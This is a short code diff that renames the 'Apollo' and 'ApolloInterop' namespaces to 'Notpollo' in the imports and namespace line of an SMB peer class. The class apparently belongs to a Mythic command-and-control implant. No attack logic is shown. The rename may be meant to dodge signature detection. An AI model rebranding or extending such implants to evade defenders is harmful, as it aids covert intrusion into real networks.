@@ -1,23 +1,23 @@
-﻿using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Serializers;
-using ApolloInterop.Structs.MythicStructs;
+﻿using NotpolloInterop.Classes;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Serializers;
+using NotpolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO.Pipes;
 using System.Linq;
 using System.Text;
-using AI = ApolloInterop;
-using ApolloInterop.Constants;
-using AS = ApolloInterop.Structs.ApolloStructs;
+using AI = NotpolloInterop;
+using NotpolloInterop.Constants;
+using AS = NotpolloInterop.Structs.NotpolloStructs;
 using System.Threading;
 using TTasks = System.Threading.Tasks;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Structs.ApolloStructs;
+using NotpolloInterop.Enums.NotpolloEnums;
+using NotpolloInterop.Classes.Core;
+using NotpolloInterop.Structs.NotpolloStructs;
 
-namespace Apollo.Peers.SMB
+namespace Notpollo.Peers.SMB
 {
     public class SMBPeer : AI.Classes.P2P.Peer
     {
